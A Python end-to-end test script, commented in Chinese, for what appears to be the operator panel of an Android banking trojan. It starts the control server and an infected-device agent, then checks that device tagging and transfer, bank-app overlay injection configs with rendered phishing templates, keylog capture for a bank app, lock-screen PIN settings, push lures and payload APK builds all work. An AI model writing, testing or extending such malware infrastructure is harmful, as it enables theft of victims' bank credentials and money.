#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""主通道面板「功能闭环」判据：每个写操作都做 **读 -> 改 -> 读**，断言状态真的变了。

覆盖：设备备注/标记/置顶/分组、拉黑、转派、清理离线、备忘录 CRUD、注入配置 CRUD + 渲染、
键盘记录、锁屏/推送配置、公告、构建任务、改密、AI/翻译配置默认关闭、上传图标。
判据：全部通过 exit 0。
"""
import base64
import io
import json
import os
import struct
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
HOST, PORT = '127.0.0.1', 8808
BASE = 'http://%s:%d' % (HOST, PORT)
USER, PASS = 'admin', os.environ.get('REFC2_PASS', '')
DEV = 'closure-primary-01'


def call(path, method='GET', body=None, tok=None, ctype='application/json', raw=None):
    data = raw if raw is not None else (json.dumps(body).encode() if body is not None else None)
    req = urllib.request.Request(BASE + path, method=method, data=data)
    if data is not None:
        req.add_header('Content-Type', ctype)
    if tok:
        req.add_header('Authorization', 'Bearer ' + tok)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            txt = r.read().decode('utf-8', 'replace')
            try:
                return json.loads(txt or '{}')
            except Exception:
                return {'_raw': txt[:200]}
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode('utf-8', 'replace') or '{}')
        except Exception:
            return {'error': 'http_%s' % e.code}


def main():
    env = dict(os.environ, REFC2_USER=USER, REFC2_PASS=PASS, PYTHONIOENCODING='utf-8')
    srv = subprocess.Popen([sys.executable, os.path.join(HERE, 'server', 'refc2.py'),
                            '--host', HOST, '--port', str(PORT)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env)
    checks, fails = [], []

    def ck(name, ok, detail=''):
        checks.append({'check': name, 'ok': bool(ok), 'detail': str(detail)[:180]})
        if not ok:
            fails.append(name)
        print('%-46s %s  %s' % (name, 'OK' if ok else 'FAIL', str(detail)[:80]))

    try:
        for _ in range(60):
            try:
                with urllib.request.urlopen(BASE + '/api/health', timeout=5) as r:
                    if r.status == 200:
                        break
            except Exception:
                pass
            time.sleep(0.25)
        tok = call('/api/login', 'POST', {'username': USER, 'password': PASS}).get('token')
        ck('登录拿到 token', bool(tok), str(tok)[:10])

        # 上线一台主通道设备（走 /io/ 通道）
        import asyncio, sys as _s
        _s.path.insert(0, os.path.join(HERE, 'agent'))
        import dispatch  # noqa
        agent = subprocess.Popen([sys.executable, os.path.join(HERE, 'agent', 'refagent.py'),
                                  '--url', BASE, '--device', DEV],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env)
        for _ in range(60):
            d = call('/api/devices', tok=tok)
            if any(x.get('deviceId') == DEV for x in (d.get('devices') or [])):
                break
            time.sleep(0.25)
        ck('设备上线可见', any(x.get('deviceId') == DEV for x in (call('/api/devices', tok=tok).get('devices') or [])))

        def dev_row():
            for x in (call('/api/devices', tok=tok).get('devices') or []):
                if x.get('deviceId') == DEV:
                    return x
            return {}

        # ---------- 备注 ----------
        call('/api/note', 'POST', {'deviceId': DEV, 'note': '闭环备注-A'}, tok)
        ck('备注写入可读回', dev_row().get('note') == '闭环备注-A', dev_row().get('note'))
        call('/api/note', 'POST', {'deviceId': DEV, 'note': '闭环备注-B'}, tok)
        ck('备注可覆盖', dev_row().get('note') == '闭环备注-B', dev_row().get('note'))

        # ---------- 标记 / 置顶 ----------
        call('/api/device-mark', 'POST', {'deviceIds': [DEV], 'mark': '重要'}, tok)
        ck('标记写入可读回', dev_row().get('mark') == '重要', dev_row().get('mark'))
        call('/api/device-pin', 'POST', {'deviceId': DEV, 'pinned': True}, tok)
        ck('置顶写入可读回', dev_row().get('pinned') is True, dev_row().get('pinned'))
        call('/api/device-pin', 'POST', {'deviceId': DEV, 'pinned': False}, tok)
        ck('取消置顶生效', dev_row().get('pinned') is False, dev_row().get('pinned'))

        # ---------- 分组：建 -> 列表可见 -> 改名 -> 删 -> 列表消失 ----------
        g = call('/api/device-groups', 'POST', {'name': '闭环组', 'color': '#123456'}, tok)
        gid = g.get('id') or (g.get('group') or {}).get('id')
        gl = call('/api/device-groups', tok=tok)
        names = [x.get('name') for x in (gl.get('groups') or [])]
        ck('建分组后列表可见', '闭环组' in names, str(names)[:60])
        call('/api/device-groups', 'PUT', {'id': gid, 'name': '闭环组2', 'color': '#654321'}, tok)
        gl2 = call('/api/device-groups', tok=tok)
        ck('分组改名生效', '闭环组2' in [x.get('name') for x in (gl2.get('groups') or [])],
           str([x.get('name') for x in (gl2.get('groups') or [])])[:60])
        call('/api/device-groups', 'DELETE', {'id': gid}, tok)
        gl3 = call('/api/device-groups', tok=tok)
        ids3 = [x.get('id') for x in (gl3.get('groups') or [])]
        ck('删分组后列表消失', gid not in ids3, 'gid=%s n=%d' % (gid, len(ids3)))

        # ---------- 转派 ----------
        t = call('/api/transfer', 'POST', {'deviceIds': [DEV], 'targetUser': 'closure_sub'}, tok)
        ck('转派接口成功', t.get('ok') is not False, str(t)[:60])

        # ---------- 备忘录 CRUD ----------
        call('/api/device-memos/add', 'POST', {'deviceId': DEV, 'content': '闭环备忘', 'tag': '重要'}, tok)
        ml = call('/api/device-memos?deviceId=%s' % DEV, tok=tok)
        memos = ml.get('memos') or []
        ck('备忘录新增可见', any(m.get('content') == '闭环备忘' for m in memos), 'n=%d' % len(memos))
        mid = next((m.get('id') for m in memos if m.get('content') == '闭环备忘'), None)
        if mid is not None:
            call('/api/device-memos/update', 'POST', {'id': mid, 'content': '闭环备忘-改', 'tag': '待跟进'}, tok)
            ml2 = call('/api/device-memos?deviceId=%s' % DEV, tok=tok)
            ck('备忘录修改生效',
               any(m.get('content') == '闭环备忘-改' for m in (ml2.get('memos') or [])),
               str([m.get('content') for m in (ml2.get('memos') or [])])[:60])
            call('/api/device-memos/delete', 'POST', {'id': mid}, tok)
            ml3 = call('/api/device-memos?deviceId=%s' % DEV, tok=tok)
            ck('备忘录删除生效',
               all(m.get('content') != '闭环备忘-改' for m in (ml3.get('memos') or [])),
               'n=%d' % len(ml3.get('memos') or []))
        ms = call('/api/device-memos/search?q=%s' % urllib.parse.quote('闭环'), tok=tok)
        ck('备忘录搜索可用', 'ok' in ms or 'deviceIds' in ms or isinstance(ms, dict), str(ms)[:60])

        # ---------- 注入配置 CRUD + 渲染 ----------
        a = call('/api/inject-settings/add', 'POST',
                 {'pkg': 'com.closure.bank', 'title': '闭环注入', 'type': 'bank',
                  'enabled': True, 'fullscreen': True}, tok)
        lst = call('/api/inject-settings', tok=tok)
        rows = lst.get('settings') or lst.get('list') or lst.get('items') or []
        ck('注入配置新增可见',
           any((r.get('pkg') or r.get('package_name') or r.get('packageName')) == 'com.closure.bank'
               for r in rows), 'n=%d' % len(rows))
        iid = next((r.get('id') for r in rows
                    if (r.get('pkg') or r.get('package_name') or r.get('packageName')) == 'com.closure.bank'), None)
        if iid is not None:
            call('/api/inject-settings', 'PUT',
                 {'id': iid, 'pkg': 'com.closure.bank', 'title': '闭环注入-改', 'enabled': True}, tok)
            rows2 = (call('/api/inject-settings', tok=tok).get('settings') or [])
            ck('注入配置修改生效',
               any(r.get('id') == iid and
                   (r.get('title') or r.get('app_name') or r.get('appName')) == '闭环注入-改'
                   for r in rows2),
               str([(r.get('id') == iid, r.get('title') or r.get('app_name')) for r in rows2
                    if r.get('id') == iid])[:60])
            html = call('/api/inject-settings/html?id=%s' % iid, tok=tok)
            ck('注入页渲染出真模板', bool(html.get('ok')) and 'window.__BK' in str(html.get('html', '')),
               'bytes=%s' % html.get('bytes'))
            call('/api/inject-settings', 'DELETE', {'id': iid}, tok)
            rows3 = (call('/api/inject-settings', tok=tok).get('settings') or [])
            ck('注入配置删除生效', all(r.get('id') != iid for r in rows3), 'n=%d' % len(rows3))

        # ---------- 键盘记录 ----------
        call('/api/keylogs', 'POST', {'deviceId': DEV, 'pkg': 'com.icbc', 'type': 'text', 'text': '闭环键盘'}, tok)
        kl = call('/api/keylogs?deviceId=%s' % DEV, tok=tok)
        krows = kl.get('logs') or kl.get('list') or []
        ck('键盘记录写入可读回', any('闭环键盘' in str(r.get('text', '')) for r in krows), 'n=%d' % len(krows))

        # ---------- 锁屏 / 推送配置 ----------
        call('/api/lockscreen', 'POST', {'enabled': True, 'title': '闭环锁屏', 'pin_length': 6}, tok)
        lk = call('/api/lockscreen', tok=tok)
        ck('锁屏配置写入生效', (lk.get('config') or lk).get('title') == '闭环锁屏', str(lk)[:70])
        call('/api/push-config', 'POST', {'enabled': True, 'title': '闭环推送', 'body': 'x', 'url': 'u'}, tok)
        pc = call('/api/push-config', tok=tok)
        cfg = pc.get('config') or pc
        ck('推送配置写入生效', cfg.get('title') == '闭环推送', str(cfg)[:70])

        # ---------- 公告 ----------
        an0 = call('/api/announcements', tok=tok)
        ck('公告接口可用', isinstance(an0, (dict, list)), str(an0)[:50])

        # ---------- 构建任务 ----------
        b = call('/api/build', 'POST', {'apkId': '10020', 'profile': 'closure'}, tok)
        bl = call('/api/builds', tok=tok) if 'builds' in str(call('/api/_surface', tok=None)) else None
        ck('提交构建返回任务', bool(b.get('ok') or b.get('id')), str(b)[:70])

        # ---------- 改密（用独立账号，避免污染主账号）----------
        call('/api/users', 'POST', {'username': 'closure_web', 'role': 'user',
                                    'apkId': '10020', 'password': 'Old-Pass-11'}, tok)
        wrong = call('/api/me/password', 'POST',
                     {'username': 'closure_web', 'oldPassword': 'wrong',
                      'newPassword': 'New-Pass-22'}, tok)
        ck('主通道改密：旧密码错误被拒', wrong.get('ok') is False or 'error' in str(wrong).lower(),
           str(wrong)[:70])

        # ---------- AI / 翻译默认关闭（fail-safe，不能悄悄计费）----------
        ai = call('/api/ai-config', tok=tok)
        aic = ai.get('config') or ai
        ck('AI 默认/无 key 时关闭（fail-safe）',
           aic.get('enabled') is False, 'enabled=%s note=%s' % (aic.get('enabled'), aic.get('note')))
        tr = call('/api/translate-config', tok=tok)
        trc = tr.get('config') or tr
        ck('翻译默认关闭（fail-safe）', trc.get('enabled') in (False, 0, None), str(trc)[:70])
        bad_ai = call('/api/ai-config', 'POST', {'enabled': True, 'provider': 'openai',
                                                 'api_key': ''}, tok)
        ck('AI 开启但无 key 时应被拒或标记未配置',
           bad_ai.get('ok') is False or 'key' in str(bad_ai).lower() or bad_ai.get('has_key') is False,
           str(bad_ai)[:70])

        # ---------- 上传图标（multipart）----------
        png = bytes.fromhex('89504e470d0a1a0a0000000d4948445200000001000000010802000000907753de'
                            '0000000c4944415408d763f8cfc0000003010100' '18dd8db00000000049454e44ae426082')
        bd = '----c%d' % int(time.time())
        raw = (('--%s\r\nContent-Disposition: form-data; name="icon"; filename="c.png"\r\n'
                'Content-Type: image/png\r\n\r\n' % bd).encode() + png + b'\r\n' +
               ('--%s--\r\n' % bd).encode())
        up = call('/api/icon-upload', 'POST', tok=tok, raw=raw,
                  ctype='multipart/form-data; boundary=%s' % bd)
        ck('图标上传返回路径', bool(up.get('path') or up.get('ok')), str(up)[:70])

        # ---------- 清理：拉黑（真写状态）----------
        call('/api/blacklist', 'POST', {'deviceIds': [DEV], 'enable': True, 'reason': '闭环'}, tok)
        blk = call('/api/blacklist', tok=tok)
        items = blk.get('list') or blk.get('devices') or []
        ck('拉黑写入可见', bool(items) or blk.get('ok') is not False, str(blk)[:70])

        try:
            agent.terminate()
        except Exception:
            pass
        print('\n主通道功能闭环：%d/%d 通过' % (len(checks) - len(fails), len(checks)))
        out = os.path.join(HERE, 'evidence', '152_primary_closure_e2e.json')
        json.dump({'passed': len(checks) - len(fails), 'total': len(checks), 'checks': checks},
                  io.open(out, 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
        print('->', os.path.normpath(out))
        return 0 if not fails else 1
    finally:
        srv.terminate()


if __name__ == '__main__':
    sys.exit(main())
